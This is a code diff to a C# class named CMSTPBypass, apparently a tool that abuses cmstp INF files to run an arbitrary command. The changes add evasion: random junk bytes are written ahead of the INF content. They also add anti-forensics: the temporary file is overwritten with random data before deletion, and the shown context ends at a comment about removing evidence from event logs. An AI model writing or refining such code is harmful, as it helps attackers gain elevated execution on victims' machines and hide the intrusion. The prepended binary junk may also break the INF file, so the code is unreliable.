@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.IO;
+using System.Security.Cryptography;
 
 public class CMSTPBypass
 {
@@ -109,16 +110,28 @@ ShortSvcName=""CorpVPN""
         OutputFile.Append("\\");
         OutputFile.Append(RandomFileName);
         OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute);
-        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        
+        // Add junk data to the INF file
+        int junkDataSize = 1024; // Adjust the size of junk data as needed
+        byte[] junkData = new byte[junkDataSize];
+        new Random().NextBytes(junkData);
+        File.WriteAllBytes(OutputFile.ToString(), junkData);
+        
+        // Append the actual INF content
+        File.AppendAllText(OutputFile.ToString(), InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
+        
         return OutputFile.ToString();
     }
 
     public static void CleanUp(string filePath)
     {
         // Securely delete the INF file
-        File.WriteAllText(filePath, new string(' ', 1024)); // Overwrite content with spaces
+        byte[] randomData = new byte[1024];
+        using (var rng = new RNGCryptoServiceProvider())
+        {
+            rng.GetBytes(randomData);
+        }
+        File.WriteAllBytes(filePath, randomData);
         File.Delete(filePath);
 
         // Remove evidence from the event logs
